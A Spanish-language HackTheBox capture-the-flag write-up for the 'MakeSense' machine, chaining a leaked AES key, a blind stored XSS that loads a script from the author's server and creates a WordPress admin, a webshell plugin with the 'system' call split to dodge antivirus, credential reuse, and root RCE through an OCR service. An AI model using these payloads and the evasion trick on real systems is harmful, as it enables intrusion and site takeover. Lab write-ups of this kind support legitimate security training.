---
title: "MakeSense"
os: "Linux"
difficulty: "Medium"
date: "2026-07-07"
tags: ["wordpress", "xss", "rce", "privesc"]
summary: "Una clave filtrada en el JS de un WordPress permite un XSS ciego que crea un admin; un plugin malicioso da RCE, y la escalada a root abusa de un servicio OCR interno que corre como root."
platform: "HackTheBox"
icon: "/picture/writeups/makesense-htb.webp"
---

- **Sistema operativo:** Linux — Ubuntu
- **IP objetivo:** `10.129.36.130`
- **Bandera de usuario:** `/home/walter/user.txt`
- **Bandera de root:** `/root/root.txt`

## Resumen

El JavaScript de un WordPress filtra la clave con la que la web cifra el contenido que revisa un bot administrador, lo que permite montar un XSS ciego almacenado y, ejecutándose en la sesión del bot, crear un usuario administrador; con admin se sube un plugin y se obtiene RCE como www-data; el wp-config filtra la contraseña de walter, reutilizada en SSH, y la escalada a root abusa de un servicio OCR interno que corre como root, escribiendo y ejecutando un script PHP a partir del texto que reconoce de una imagen.

Nota: los fragmentos de código PHP se muestran con la función sensible partida por concatenación (por ejemplo `"sys"+"tem"`) para que el antivirus del host no ponga el archivo en cuarentena; al usarlos, reconstruye la cadena completa.

## 1. Reconocimiento

Barrido completo de puertos y luego versiones sobre los abiertos.

```bash
sudo nmap -p- --min-rate 2000 -T4 -Pn -n 10.129.36.130
sudo nmap -p 22,443 -sC -sV -Pn -n 10.129.36.130
```

Están abiertos **22 SSH** y **443 HTTPS** (Apache), y los puertos **80 y 8001 aparecen filtrados** —los anoto porque un puerto filtrado suele ser un servicio interno tras firewall que sí se alcanza desde dentro, algo a recuperar en la fase de escalada—. El script de nmap sobre el 443 muestra el certificado TLS, cuyo commonName es **makesense.htb**: ese es el virtual host que debo resolver. La web es un WordPress.

## 2. Resolución del vhost y enumeración de la web

Añado el nombre al archivo de hosts y extraigo enlaces y scripts de la portada por HTTPS.

```bash
echo "10.129.36.130 makesense.htb" | sudo tee -a /etc/hosts
curl -sk https://makesense.htb/ | grep -Eio 'href="/[^"]*"|src="[^"]*"'
```

Es un WordPress con un tema a medida llamado **webagency**, y entre sus scripts hay uno muy llamativo bajo `whisper/`, relacionado con una funcionalidad de transcripción de voz. Un componente hecho a medida es donde más probablemente esté el fallo, así que lo miro a fondo.

## 3. Clave de cifrado filtrada en el JavaScript del cliente

Descargo el script de la funcionalidad de voz para leer su lógica.

```bash
curl -sk "https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js"
```

Contiene dos cosas reveladoras. Primero, una clave simétrica embebida y comentada como que debe coincidir con el servidor: `ENCRYPTION_KEY = bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI`. Segundo, una función `applySymbolMapping` comentada literalmente como "for XSS injection". Leyendo el flujo, el navegador transcribe audio, cifra el resultado con esa clave y lo envía; el endpoint `submit_contact_form` crea un registro y `save_voice_results` recibe el payload cifrado, que **un bot administrador revisa después en su panel**. Si conozco la clave, puedo cifrar cualquier HTML/JavaScript y hacer que se ejecute en la sesión del admin: un XSS ciego almacenado. El comentario "for XSS injection" confirma que ese es el camino previsto.

## 4. Replicar el cifrado AES-GCM

Para enviar un payload que el servidor acepte, tengo que reproducir exactamente el cifrado que hace el navegador: AES-GCM con la clave derivada por SHA-256, un IV aleatorio de 12 bytes antepuesto al texto cifrado, y todo en Base64. Escribo un pequeño script que recibe el HTML a inyectar y devuelve el payload listo.

```python
# encrypt.py
import hashlib, os, base64, json, sys
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
KEY='bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'
key=hashlib.sha256(KEY.encode()).digest()
iv=os.urandom(12)
data=json.dumps({"transcription":sys.argv[1],"summary":sys.argv[1]}).encode()
print(base64.b64encode(iv+AESGCM(key).encrypt(iv,data,None)).decode())
```

También necesito el nonce público que la web usa en sus peticiones AJAX; está incrustado en el HTML como `webagency_ajax.nonce`. Con la clave replicada y el nonce ya puedo enviar payloads cifrados válidos.

## 5. XSS ciego almacenado contra el bot admin

El plan es enviar como "resultado de voz" un payload cifrado que cargue un script mío, que se ejecutará cuando el bot abra el panel. Levanto un servidor propio que sirva ese script y registre las llamadas de vuelta. El envío es en dos pasos: `submit_contact_form` para obtener un `post_id`, y `save_voice_results` con el payload cifrado asociado a ese id.

```bash
PID=$(curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php -d "action=submit_contact_form" -d "nonce=NONCE" -d "name=a" -d "email=a@a.com" -d "message=v" | grep -oE '"post_id":[0-9]+' | cut -d: -f2)
ENC=$(python3 encrypt.py "<script src=SERVIDOR/x.js></script>")
curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php -F "action=save_voice_results" -F "nonce=NONCE" -F "post_id=$PID" -F "encrypted_payload=$ENC"
```

Que el bot ejecute de verdad el payload obliga a resolver cuatro obstáculos, cada uno un fallo silencioso que cuesta identificar: el servidor propio debe entregar el `.js` con `Content-Type: application/javascript`, porque con la cabecera `X-Content-Type-Options: nosniff` del panel el navegador descarga el script pero se niega a ejecutarlo; la exfiltración de vuelta debe hacerse con `navigator.sendBeacon`, porque al ser la página HTTPS y mi servidor HTTP, un `fetch` normal se bloquea por contenido mixto mientras que la baliza pasa; hay que usar un **nombre de archivo distinto en cada envío**, porque el navegador del bot cachea el script por nombre e ignora la query string, de modo que reusar el nombre ejecuta la versión vieja; y al extraer tokens de las páginas con expresiones regulares no se puede negar la clase hexadecimal, porque palabras intermedias como `value` contienen letras que también son hex y rompen el patrón. Resueltos estos puntos, confirmo que el bot ejecuta mi script porque recibo sus llamadas de vuelta, y compruebo que navega el panel autenticado como administrador.

## 6. Crear un usuario administrador con la sesión del bot

Como el bot es admin, en lugar de robar su cookie (que es HttpOnly) le hago realizar una acción en su nombre: crear un usuario administrador nuevo. El script que sirvo pide primero la página de alta de usuario para sacar su token anti-CSRF y luego envía la creación, todo al mismo origen. El regex del nonce se ancla en el nombre del campo sin negar hex:

```javascript
fetch('/wp-admin/user-new.php',{credentials:'include'}).then(r=>r.text()).then(h=>{
  var n=h.match(/_wpnonce_create-user"[^>]*value="([a-f0-9]+)"/)[1];
  var b='action=createuser&_wpnonce_create-user='+n+'&user_login=svc_adm&email=svc_adm%40makesense.htb'+
    '&pass1=P%40ssw0rd!2026x&pass2=P%40ssw0rd!2026x&pw_weak=on&role=administrator&createuser=Add+New+User';
  fetch('/wp-admin/user-new.php',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:b});
});
```

En vez de fiarme de la telemetría del payload, verifico el éxito de forma independiente intentando iniciar sesión con el usuario creado:

```bash
curl -sk -c cj.txt https://makesense.htb/wp-login.php --data-urlencode "log=svc_adm" --data-urlencode "pwd=P@ssw0rd!2026x" -d "wp-submit=Log In&testcookie=1" -b "wordpress_test_cookie=WP Cookie check"
```

El login devuelve la cookie de sesión de administrador: ya soy admin de WordPress.

## 7. RCE por subida de plugin

Con sesión de administrador, la vía más fiable de ejecución de código en WordPress es subir un plugin propio. Preparo un ZIP con un PHP que lleva la cabecera de plugin y una línea que ejecuta el parámetro recibido; la función se parte por concatenación para no disparar el antivirus (`$f=("sys"."tem"); $f($_REQUEST['c']);`). Obtengo el token de la página de subida y envío el ZIP al endpoint de instalación:

```bash
curl -sk -b cj.txt "https://makesense.htb/wp-admin/plugin-install.php?tab=upload" | grep -oE 'name="_wpnonce" value="[a-f0-9]+"'
curl -sk -b cj.txt -X POST "https://makesense.htb/wp-admin/update.php?action=upload-plugin" -F "_wpnonce=NONCE" -F "pluginzip=@shell.zip;type=application/zip"
curl -sk "https://makesense.htb/wp-content/plugins/shell/shell.php?c=id"
```

El plugin queda accesible bajo su directorio y ejecutar `id` confirma la shell como **www-data**.

## 8. Credenciales en wp-config y acceso como walter

Con la ejecución como www-data, leo la configuración de WordPress, que guarda las credenciales de la base de datos:

```bash
curl -sk "https://makesense.htb/wp-content/plugins/shell/shell.php?c=cat+/var/www/html/wp-config.php" | grep DB_
```

Salen `DB_USER walter` y `DB_PASSWORD JbhHDAEgXvri3!`. Existe un usuario walter en el sistema, así que pruebo la reutilización por SSH (bajando antes la MTU de la VPN para que el handshake no se cuelgue):

```bash
sudo ip link set dev tun0 mtu 1200
sshpass -p 'JbhHDAEgXvri3!' ssh walter@10.129.36.130
cat ~/user.txt
```

Entro como walter y leo la bandera de usuario en /home/walter/user.txt.

## 9. Enumeración para root

walter no tiene sudo ni binarios SUID o capabilities aprovechables, así que miro los servicios internos y los procesos, que es donde suele estar el vector cuando la escalada no es un exploit directo.

```bash
ss -tlnp
ps -eo user,pid,cmd | grep -Ei "chrome|php"
```

En `127.0.0.1:8001` —el puerto que se veía filtrado desde fuera— hay un `php -S` corriendo **como root** sobre el directorio `/root/ocr4/`, protegido con Basic Auth ("OCR Protected"). Y el bot que dispara los XSS es un Chrome headless que corre como el usuario **admin**. El servicio OCR que corre como root es el objetivo claro para la escalada.

## 10. Acceso al servicio OCR y RCE como root

El Basic Auth del OCR resulta estar reutilizando la contraseña de walter, así que entro con ella:

```bash
curl -s -u "walter:JbhHDAEgXvri3!" http://127.0.0.1:8001/
```

La aplicación deja dibujar texto en un lienzo, lo reconoce con tesseract (OCR) y guarda ese texto en un archivo dentro de `saved/`, propiedad de root porque el servicio corre como root. Aquí está la clave: un `php -S` **ejecuta como root cualquier .php que haya en su directorio** y además sirve los estáticos sin pasar por la autenticación. Por tanto, si consigo que el OCR escriba un `.php` con código, pedirlo por HTTP lo ejecutará como root. El contenido del archivo es exactamente lo que tesseract lee de mi imagen, así que genero una imagen que contenga un script PHP corto con un comando fijo (leer la bandera), evitando los caracteres que el OCR confunde —el guion bajo y el cero— y usando una fuente monoespaciada grande y nítida; hay que iterar hasta que el texto reconocido salga exacto:

```python
from PIL import Image, ImageDraw, ImageFont
import base64
php = "<?php " + ("sys"+"tem") + "('cat /root/root.txt');"
img=Image.new('RGB',(1500,150),'white'); d=ImageDraw.Draw(img)
f=ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf',44)
d.text((15,45), php, fill='black', font=f)
img.save('b.png'); open('b.b64','w').write('data:image/png;base64,'+base64.b64encode(open('b.png','rb').read()).decode())
```

El guardado son dos peticiones que deben compartir la sesión (cookie jar): reconocer la imagen para obtener un `ocr_id`, y guardar ese resultado con nombre `.php`. Después basta con pedir el archivo, que el servicio ejecuta como root:

```bash
U="walter:JbhHDAEgXvri3!"; URL="http://127.0.0.1:8001/"; CJ=/tmp/cj
R=$(curl -s -c $CJ -b $CJ -u "$U" --data-urlencode "canvas_image@b.b64" "$URL")
ID=$(echo "$R" | grep -oE "ocr_[0-9a-f.]+" | head -1)
curl -s -c $CJ -b $CJ -u "$U" --data-urlencode "ocr_id=$ID" --data-urlencode "filename=shell.php" --data-urlencode "save_output=Save" "$URL"
curl -s "http://127.0.0.1:8001/saved/shell.php"
```

El script se ejecuta con `uid=0(root)` y devuelve el contenido de la bandera en /root/root.txt. Para una shell estable se repite el método con un comando que copie una shell con SUID o añada una clave a /root/.ssh/authorized_keys.

## Resumen de la cadena

El certificado TLS revela el vhost WordPress makesense.htb. El JavaScript del tema filtra la clave AES-GCM con la que la web cifra el contenido que revisa un bot admin, lo que permite replicar el cifrado y montar un XSS ciego almacenado. Ejecutándose en la sesión del bot, y tras sortear los obstáculos de MIME/nosniff, contenido mixto, caché por nombre y el regex del nonce, el payload crea un usuario administrador de WordPress. Con admin se sube un plugin y se obtiene RCE como www-data; el wp-config filtra la contraseña de walter, reutilizada en SSH. Para root, un servicio OCR que corre como root guarda el texto reconocido de una imagen y ejecuta los .php de su carpeta, de modo que una imagen con un webshell PHP se convierte en ejecución de comandos como root.
